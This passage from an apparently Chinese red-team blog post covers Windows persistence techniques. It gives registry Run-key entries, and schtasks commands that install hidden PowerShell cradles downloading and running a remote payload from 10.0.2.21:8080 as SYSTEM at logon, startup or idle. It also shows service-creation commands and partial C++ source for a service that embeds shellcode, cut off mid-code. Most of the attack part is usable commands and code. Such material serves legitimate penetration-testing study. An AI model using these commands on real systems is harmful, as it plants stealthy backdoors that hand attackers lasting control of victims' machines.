    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>这方法确实好用</p>
<pre tabindex="0"><code>reg add &#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&#34; /v Pentestlab /t REG_SZ /d &#34;C:\Users\Administrator\Desktop\test\11447788.bat&#34;
reg add &#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&#34; /v Pentestlab /t REG_SZ /d &#34;C:\Users\Administrator\Desktop\test\11447788.bat&#34;
reg add &#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices&#34; /v Pentestlab /t REG_SZ /d &#34;C:\Users\Administrator\Desktop\test\11447788.batxe&#34;
reg add &#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&#34; /v Pentestlab /t REG_SZ /d &#34;C:\Users\Administrator\Desktop\test\11447788.bat&#34;</code></pre><p>组策略那个我试了好久都没成功</p>
<p>360直接拦</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407221638472.webp" alt="image-20240722163839276" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407221638472.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407221638472.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407221638472.webp?size=large 2x" data-title="image-20240722163839276" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h1 id="计划任务" class="heading-element"><span>计划任务</span>
  <a href="#%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>Windows操作系统提供了一个实用程序（schtasks.exe），使系统管理员能够在特定的日期和时间执行程序或脚本。这种行为可作为一种持久性机制被red team利用。通过计划任务执行持久性不需要管理员权限，但如果已获得提升的权限，则允许进一步操作，例如在用户登录期间或在空闲状态期间执行任务。 计划任务的持久化技术可以手动实现，也可以自动实现。payload可以从磁盘或远程位置执行，它们可以是可执行文件、powershell脚本或scriptlet的形式。<strong>这被认为是一种旧的持久性技术，但是它仍然可以在red team场景中使用，并且由各种开源工具支持</strong>。</p>
<blockquote>
<p>图形化位置：开始&ndash;所有程序&ndash;附件&ndash;系统工具&ndash;任务计划程序</p>
</blockquote>
<p>Windows命令行实现定时任务主要有schtasks与at二种方式:</p>
<p>at 适用于windows xp/2003，schtasks适用于win7/2008或者以后</p>
<p>每五分钟执行一次</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span> <span style="color:#58a1dd">schtasks</span> /<span style="color:#58a1dd">create</span> /<span style="color:#58a1dd">sc </span><span style="color:#58a1dd">minute</span> /<span style="color:#58a1dd">mo</span> <span style="color:#a6be9d">5</span> /<span style="color:#58a1dd">tn</span> <span style="color:#a6be9d">&#34;sd&#34;</span> /<span style="color:#58a1dd">tr</span> <span style="color:#58a1dd">C:</span>\<span style="color:#58a1dd">Windows</span>\<span style="color:#58a1dd">System32</span>\<span style="color:#58a1dd">cmd</span>.<span style="color:#58a1dd">exe</span></span></span></code></pre></div><p>该任务将在每个Windows登录中以SYSTEM的形式下载并执行基于PowerShell的payload。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">schtasks</span> /<span style="color:#58a1dd">create</span> /<span style="color:#58a1dd">tn</span> <span style="color:#58a1dd">PentestLab</span> /<span style="color:#58a1dd">tr</span> <span style="color:#a6be9d">&#34;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> /<span style="color:#58a1dd">sc </span><span style="color:#58a1dd">onlogon</span> /<span style="color:#58a1dd">ru</span> <span style="color:#58a1dd">System</span></span></span></code></pre></div><p>一些举例</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#(X64) - On System Start</span>
</span></span><span style="display:flex;"><span>schtasks /create /tn PentestLab /tr <span style="color:#a6be9d">&#34;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> /sc onstart /ru System
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#(X64) - On User Idle (30mins)</span>
</span></span><span style="display:flex;"><span>schtasks /create /tn PentestLab /tr <span style="color:#a6be9d">&#34;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> /sc onidle /i <span style="color:#a6be9d">30</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#(X86) - On User Login</span>
</span></span><span style="display:flex;"><span>schtasks /create /tn PentestLab /tr <span style="color:#a6be9d">&#34;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> /sc onlogon /ru System
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#(X86) - On System Start</span>
</span></span><span style="display:flex;"><span>schtasks /create /tn PentestLab /tr <span style="color:#a6be9d">&#34;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> /sc onstart /ru System
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#(X86) - On User Idle (30mins)</span>
</span></span><span style="display:flex;"><span>schtasks /create /tn PentestLab /tr <span style="color:#a6be9d">&#34;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> /sc onidle /i <span style="color:#a6be9d">30</span></span></span></code></pre></div><h1 id="服务" class="heading-element"><span>服务</span>
  <a href="#%e6%9c%8d%e5%8a%a1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>在 Windows上还有一个重要的机制，也就是服务。服务程序通常默默的运行在后台，且拥有 SYSTEM 权限，非常适合用于后门持久化。我们可以将 EXE /DLL等可执行文件注册为服务实现后门持久化。</p>
<h2 id="创建服务" class="heading-element"><span>创建服务</span>
  <a href="#%e5%88%9b%e5%bb%ba%e6%9c%8d%e5%8a%a1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="cmd直接创建服务" class="heading-element"><span>CMD直接创建服务</span>
  <a href="#cmd%e7%9b%b4%e6%8e%a5%e5%88%9b%e5%bb%ba%e6%9c%8d%e5%8a%a1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">sc </span><span style="color:#58a1dd">create</span> <span style="color:#a6be9d">&#34;SD&#34;</span> <span style="color:#58a1dd">binpath</span>= <span style="color:#a6be9d">&#34;C:\Users\SD\Desktop\test.exe&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">sc </span><span style="color:#58a1dd">description</span> <span style="color:#a6be9d">&#34;SD&#34;</span> <span style="color:#a6be9d">&#34;description&#34;</span> <span style="color:#828b96;font-style:italic"># 设置服务的描述字符串</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">sc </span><span style="color:#58a1dd">config</span> <span style="color:#a6be9d">&#34;SD&#34;</span> <span style="color:#58a1dd">start</span>= <span style="color:#58a1dd">auto</span>  <span style="color:#828b96;font-style:italic"># 设置这个服务为自动启动</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">net</span> <span style="color:#58a1dd">start </span><span style="color:#a6be9d">&#34;SD&#34;</span> <span style="color:#828b96;font-style:italic"># 启动服务</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">sc </span><span style="color:#58a1dd">create</span> <span style="color:#58a1dd">pentestlab</span> <span style="color:#58a1dd">binpath</span>= <span style="color:#a6be9d">&#34;cmd.exe /k C:\temp\pentestlab.exe&#34;</span> <span style="color:#58a1dd">start</span>=<span style="color:#a6be9d">&#34;auto&#34;</span> <span style="color:#58a1dd">obj</span>=<span style="color:#a6be9d">&#34;LocalSystem&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">sc start </span><span style="color:#58a1dd">pentestlab</span></span></span></code></pre></div><h3 id="powershell创建服务" class="heading-element"><span>Powershell创建服务</span>
  <a href="#powershell%e5%88%9b%e5%bb%ba%e6%9c%8d%e5%8a%a1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">New-Service</span> <span style="color:#58a1dd">-Name</span> <span style="color:#a6be9d">&#34;pentestlab&#34;</span> <span style="color:#58a1dd">-BinaryPathName</span> <span style="color:#a6be9d">&#34;C:\temp\pentestlab.exe&#34;</span> <span style="color:#58a1dd">-Description</span> <span style="color:#a6be9d">&#34;PentestLaboratories&#34;</span> <span style="color:#58a1dd">-StartupType</span> <span style="color:#58a1dd">Automatic</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">sc start </span><span style="color:#58a1dd">pentestlab</span></span></span></code></pre></div><h3 id="其他" class="heading-element"><span>其他</span>
  <a href="#%e5%85%b6%e4%bb%96" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>也可以直接编写一个服务,穿插着shellcode上线</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#include 
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#include 
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">unsigned</span> <span style="color:#ff636f">char</span> <span style="color:#58a1dd">buf</span>[] <span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\xfc\xe8\x89\x00\x00</span><span style="color:#a6be9d">...............................................</span><span style="color:#a6be9d">\x36\x38\x2e\x31\x2e\x31\x30\x36\x00\x12\x34\x56\x78</span><span style="color:#a6be9d">&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#define SLEEP_TIME 5000                          </span><span style="color:#828b96;font-style:italic">/*间隔时间*/</span><span style="color:#828b96;font-style:italic">
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#define LOGFILE &#34;C:\\Windows\\log1.txt&#34;              </span><span style="color:#828b96;font-style:italic">/*信息输出文件*/</span><span style="color:#828b96;font-style:italic">
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SERVICE_STATUS</span> <span style="color:#58a1dd">ServiceStatus</span>;  <span style="color:#828b96;font-style:italic">/*服务状态*/</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SERVICE_STATUS_HANDLE</span> <span style="color:#58a1dd">hStatus</span>; <span style="color:#828b96;font-style:italic">/*服务状态句柄*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">void</span>  <span style="color:#58a1dd">ServiceMain</span>(<span style="color:#ff636f">int</span> <span style="color:#58a1dd">argc</span>, <span style="color:#ff636f">char</span><span style="color:#ff636f">**</span> <span style="color:#58a1dd">argv</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">void</span>  <span style="color:#58a1dd">CtrlHandler</span>(<span style="color:#58a1dd">DWORD</span> <span style="color:#58a1dd">request</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">int</span>   <span style="color:#58a1dd">InitService</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">int</span> <span style="color:#58a1dd">main</span>(<span style="color:#ff636f">int</span> <span style="color:#58a1dd">argc</span>, <span style="color:#58a1dd">CHAR</span><span style="color:#ff636f">*</span> <span style="color:#58a1dd">argv</span>[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">WCHAR</span> <span style="color:#58a1dd">WserviceName</span>[] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">TEXT</span>(<span style="color:#a6be9d">&#34;sddd&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SERVICE_TABLE_ENTRY</span> <span style="color:#58a1dd">ServiceTable</span>[<span style="color:#a6be9d">2</span>];
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceTable</span>[<span style="color:#a6be9d">0</span>].<span style="color:#58a1dd">lpServiceName</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">WserviceName</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceTable</span>[<span style="color:#a6be9d">0</span>].<span style="color:#58a1dd">lpServiceProc</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">LPSERVICE_MAIN_FUNCTION</span>)<span style="color:#58a1dd">ServiceMain</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceTable</span>[<span style="color:#a6be9d">1</span>].<span style="color:#58a1dd">lpServiceName</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">NULL</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceTable</span>[<span style="color:#a6be9d">1</span>].<span style="color:#58a1dd">lpServiceProc</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">NULL</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">StartServiceCtrlDispatcher</span>(<span style="color:#58a1dd">ServiceTable</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span> <span style="color:#a6be9d">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">int</span> <span style="color:#58a1dd">WriteToLog</span>(<span style="color:#ff636f">const</span> <span style="color:#ff636f">char</span><span style="color:#ff636f">*</span> <span style="color:#58a1dd">str</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">FILE</span><span style="color:#ff636f">*</span> <span style="color:#58a1dd">pfile</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">fopen_s</span>(<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">pfile</span>, <span style="color:#58a1dd">LOGFILE</span>, <span style="color:#a6be9d">&#34;a+&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> (<span style="color:#58a1dd">pfile</span> <span style="color:#ff636f">==</span> <span style="color:#58a1dd">NULL</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span> <span style="color:#ff636f">-</span><span style="color:#a6be9d">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">fprintf_s</span>(<span style="color:#58a1dd">pfile</span>, <span style="color:#a6be9d">&#34;%s</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">&#34;</span>, <span style="color:#58a1dd">str</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">fclose</span>(<span style="color:#58a1dd">pfile</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span> <span style="color:#a6be9d">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">/*Service initialization*/</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">int</span> <span style="color:#58a1dd">InitService</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">CHAR</span> <span style="color:#58a1dd">Message</span>[] <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;Monitoring started.&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">OutputDebugString</span>(<span style="color:#58a1dd">TEXT</span>(<span style="color:#a6be9d">&#34;Monitoring started.&#34;</span>));
</span></span><span style="display:flex;"><span><span style="color:#ff636f">int</span> <span style="color:#58a1dd">result</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">result</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">WriteToLog</span>(<span style="color:#58a1dd">Message</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span>(<span style="color:#58a1dd">result</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">/*Control Handler*/</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">void</span> <span style="color:#58a1dd">CtrlHandler</span>(<span style="color:#58a1dd">DWORD</span> <span style="color:#58a1dd">request</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#ff636f">switch</span> (<span style="color:#58a1dd">request</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#ff636f">case</span> <span style="color:#58a1dd">SERVICE_CONTROL_STOP</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">WriteToLog</span>(<span style="color:#a6be9d">&#34;Monitoring stopped.&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwWin32ExitCode</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwCurrentState</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">SERVICE_STOPPED</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SetServiceStatus</span>(<span style="color:#58a1dd">hStatus</span>, <span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">ServiceStatus</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">case</span> <span style="color:#58a1dd">SERVICE_CONTROL_SHUTDOWN</span>:
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">WriteToLog</span>(<span style="color:#a6be9d">&#34;Monitoring stopped.&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwWin32ExitCode</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwCurrentState</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">SERVICE_STOPPED</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SetServiceStatus</span>(<span style="color:#58a1dd">hStatus</span>, <span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">ServiceStatus</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff636f">default</span><span style="color:#ff636f">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">break</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">/* Report current status  */</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SetServiceStatus</span>(<span style="color:#58a1dd">hStatus</span>, <span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">ServiceStatus</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">void</span> <span style="color:#58a1dd">ServiceMain</span>(<span style="color:#ff636f">int</span> <span style="color:#58a1dd">argc</span>, <span style="color:#ff636f">char</span><span style="color:#ff636f">**</span> <span style="color:#58a1dd">argv</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">WCHAR</span> <span style="color:#58a1dd">WserviceName</span>[] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">TEXT</span>(<span style="color:#a6be9d">&#34;sddd&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">int</span> <span style="color:#58a1dd">error</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwServiceType</span> <span style="color:#ff636f">=</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SERVICE_WIN32</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ServiceStatus</span>.<span style="color:#58a1dd">dwCurrentState</span> <span style="color:#ff636f">=</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SERVICE_START_PENDING</span>;
